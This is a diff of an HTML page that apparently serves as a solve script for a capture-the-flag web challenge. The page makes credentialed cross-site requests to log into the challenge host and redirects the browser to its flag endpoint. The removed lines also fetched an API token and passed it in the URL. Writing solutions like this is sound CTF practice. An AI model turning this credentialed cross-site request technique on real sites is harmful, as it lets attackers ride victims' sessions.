@@ -6,46 +6,32 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: system-ui, sans-serif; margin: 2rem; }
-    pre { background: #f0f0f0; padding: 1rem; }
   </style>
 </head>
 <body>
   <h1>Fetching Flag...</h1>
-  <pre id="output"></pre>
+  <p>If this page doesn’t redirect automatically, <a id="flagLink" href="#">click here</a>.</p>
 
   <script>
-    const out = document.getElementById('output');
-    const log = msg => out.textContent += msg + "\n";
-
-    async function call(path, init) {
-      const res = await fetch(path, { credentials: 'include', ...init });
-      const text = await res.text();
-      return { status: res.status, text, json: () => JSON.parse(text) };
-    }
-
     (async () => {
-      log("Starting...");
+      const log = msg => console.log(msg);
 
-      // 1️⃣ Login
-      const loginRes = await call('https://web200-1.pointeroverflowctf.com/login', { method: 'POST' });
-      log(`Login: ${loginRes.status} ${loginRes.text}`);
+      log("Starting login...");
 
-      // 2️⃣ Fetch token
-      const tokenRes = await call('https://web200-1.pointeroverflowctf.com/api/token');
-      log(`Token response: ${tokenRes.status} ${tokenRes.text}`);
+      // 1️⃣ Login to create a session
+      await fetch('https://web200-1.pointeroverflowctf.com/login', {
+        method: 'POST',
+        credentials: 'include'
+      });
 
-      let token;
-      try { token = (await tokenRes.json()).apiToken; } 
-      catch (e) { log("Failed to parse token"); return; }
-      log(`Token: ${token}`);
+      log("Login complete. Redirecting to flag...");
 
-      // 3️⃣ Redirect the browser to /api/flag
-      log("Redirecting browser to /api/flag...");
-      
-      // We can't set custom headers in a normal redirect, so the trick is to pass the token as a query param
-      // If the server expects the token in a header, this only works if server allows token in URL for browser navigation
-      // Otherwise you need a real clickable link for the user.
-      window.location.href = `https://web200-1.pointeroverflowctf.com/api/flag?token=${encodeURIComponent(token)}`;
+      // 2️⃣ Redirect the browser to /api/flag
+      window.location.href = 'https://web200-1.pointeroverflowctf.com/api/flag';
+
+      // 3️⃣ Fallback link in case auto-redirect fails
+      const a = document.getElementById('flagLink');
+      a.href = 'https://web200-1.pointeroverflowctf.com/api/flag';
     })();
   </script>
 </body>
